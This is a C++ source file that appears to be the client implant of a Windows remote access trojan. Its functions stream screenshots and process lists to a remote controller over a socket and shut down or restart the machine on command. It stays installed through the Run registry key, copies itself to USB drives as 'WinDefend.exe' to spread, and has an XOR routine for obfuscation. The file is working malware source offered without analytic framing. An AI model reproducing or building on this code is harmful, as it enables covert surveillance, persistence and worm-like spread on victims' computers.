#include "probe.h"

using namespace Server;
using namespace Network;

void  System::TimeStamp(char buffer[100])
{
    time_t t = time(0);
    struct tm* now = localtime(&t);
    memset(buffer, '\0', 100);
    strftime(buffer, 100, "%Y-%m-%d-%S", now);
}

void System::poweroff(int code)
{
    switch (code)
    {
        // poweroff
    case 0:
        ExecSock(0, (char*)"cmd.exe /c shutdown /s /t 0");
        break;

        // log off
    case 1:
        ExecSock(0, (char*)"cmd.exe /c shutdown /l /t 0");
        break;

        // Restart
    case 2:
        ExecSock(0, (char*)"cmd.exe /c shutdown /r /t 0");
        break;

    default:
        break;
    }
}

int  System::CaptureAnImage(HWND hWnd, SOCKET sockfd)
{
    HDC hdcScreen;
    HDC hdcWindow;
    HDC hdcMemDC = NULL;
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    char buffer[100];
    // Retrieve the handle to a display device context for the client 
    // area of the window. 
    hdcScreen = GetDC(NULL);
    hdcWindow = GetDC(hWnd);

    // Create a compatible DC which is used in a BitBlt from the window DC
    hdcMemDC = CreateCompatibleDC(hdcWindow);

    if (!hdcMemDC)
    {
        sockprintf("CreateCompatibleDC has failed Error %i", GetLastError());
        //goto done;
    }

    // Get the client area for size calculation
    RECT rcClient;
    GetClientRect(hWnd, &rcClient);

    //This is the best stretch mode
    SetStretchBltMode(hdcWindow, HALFTONE);

    //The source DC is the entire screen and the destination DC is the current window (HWND)
    if (!StretchBlt(hdcWindow,
        0, 0,
        rcClient.right, rcClient.bottom,
        hdcScreen,
        0, 0,
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        SRCCOPY))
    {
        sockprintf("StretchBlt has failed Error %i", GetLastError());
        //goto done;
    }

    // Create a compatible bitmap from the Window DC
    hbmScreen = CreateCompatibleBitmap(hdcWindow, rcClient.right - rcClient.left, rcClient.bottom - rcClient.top);

    if (!hbmScreen)
    {
        sockprintf("CreateCompatibleBitmap Failed Error %i", GetLastError());
        //goto done;
    }

    // Select the compatible bitmap into the compatible memory DC.
    SelectObject(hdcMemDC, hbmScreen);

    // Bit block transfer into our compatible memory DC.
    if (!BitBlt(hdcMemDC,
        0, 0,
        rcClient.right - rcClient.left, rcClient.bottom - rcClient.top,
        hdcWindow,
        0, 0,
        SRCCOPY))
    {
        sockprintf("BitBlt has failed Error %i", GetLastError());
        //sgoto done;
    }

    // Get the BITMAP from the HBITMAP
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

    BITMAPFILEHEADER   bmfHeader;
    BITMAPINFOHEADER   bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    // Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
    // call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
    // have greater overhead than HeapAlloc.
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    // Gets the "bits" from the bitmap and copies them into a buffer 
    // which is pointed to by lpbitmap.
    GetDIBits(hdcWindow, hbmScreen, 0,
        (UINT)bmpScreen.bmHeight,
        lpbitmap,
        (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // A file is created, this is where we will save the screen capture.
    /* HANDLE hFile = CreateFile(L"captureqwsx.bmp",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
        */
        // Add the size of the headers to the size of the bitmap to get the total file size
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    //Offset to where the actual bitmap bits start.
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

    //Size of the file
    bmfHeader.bfSize = dwSizeofDIB;

    //bfType must always be BM for Bitmaps
    bmfHeader.bfType = 0x4D42; //BM   

    TimeStamp(buffer);
    sockprintf("SCREENSHOT:%s.bmp:%i", buffer, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
    Sleep(1000);
    DWORD dwBytesWritten = 0;
    WriteFile((HANDLE)sockfd, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile((HANDLE)sockfd, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile((HANDLE)sockfd, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    //Unlock and Free the DIB from the heap
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);

    //Close the handle for the file that was created
    // CloseHandle(hFile);

    //Clean up
done:
    if (hbmScreen) {
        DeleteObject(hbmScreen);
    }

    if (hdcMemDC) {
        DeleteObject(hdcMemDC);
    }

    ReleaseDC(NULL, hdcScreen);
    ReleaseDC(hWnd, hdcWindow);

    return 0;
}


char* System::appDataPath()
{
    static char szPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, szPath))) {
        return szPath;
    }
    else {
        return (char*)"C:\\Users\\Public"; // If We are unable to get the AppData/Romaing path, Use Public $HOME folder for installation
    }
}



void  System::StartupKey(const char* INSTALL_FOLDER_NAME, const char* czExePath)
{
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE,
        &hKey);
    if (ERROR_SUCCESS == lnRes)
    {
        lnRes = RegSetValueEx(hKey,
            INSTALL_FOLDER_NAME,
            0,
            REG_SZ,
            (const BYTE*)czExePath,
            strlen(czExePath));
    }

    RegCloseKey(hKey);
    sockprintf("F_ERRAdded Startup key for '%s' with name '%s'.", czExePath, INSTALL_FOLDER_NAME);
}


DWORD WINAPI System::USBINFECT(LPVOID lpParameter) {
    BOOL USB_THREAD = TRUE;
    if (USB_THREAD)
    {
        while (true)
        {
            Sleep(3000);
            for (char i = 'A'; i <= 'Z'; i++) {
                std::string path;
                path.push_back(i);
                path += ":\\";

                if (GetDriveTypeA(path.c_str()) == DRIVE_REMOVABLE) {
                    path += "WinDefend.exe";
                    if (!isFile(path.c_str())) {
                        CopyFileA(MyLocation().c_str(), path.c_str(), FALSE);
                        break;
                    }
                }
            }
        }
    }

    return 0;
}

std::string  System::ProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("[unknown]");

    // Get a handle to the process.

    std::ostringstream st;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    // Print the process name and identifier.

    st << "P:" << szProcessName << ":" << processID;
   
    // Release the handle to the process.
    if (hProcess) {
        CloseHandle(hProcess);
    }
    return st.str();
}

void  System::SendProcessList()
{
    DWORD aProcesses[BUFFER], cbNeeded, cProcesses;
    std::ostringstream s;
    unsigned int i;

    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
    {
        sockprintf("F_ERRError enumerating processes : %ld\n", GetLastError());
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    s << "<LISTPROCESS>\n";

    for ( i = 0; i < cProcesses; i++ )
    {
        if( aProcesses[i] != 0 )
        {
            s << ProcessNameAndID( aProcesses[i] ) << "\n";
        }
    }

    sockSend(s.str().c_str());
}

BOOL System::IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        dwError = GetLastError();

    }
    else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
        &fIsRunAsAdmin)) {
        dwError = GetLastError();

    }

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    return fIsRunAsAdmin;
}

std::string  System::XOR(std::string data, std::string encrypted_key) {
    std::string output = data;

    for (int i = 0; i < data.size(); i++) {
        output[i] = data[i] ^ encrypted_key[i % encrypted_key.size()];
    }
    return output;
}
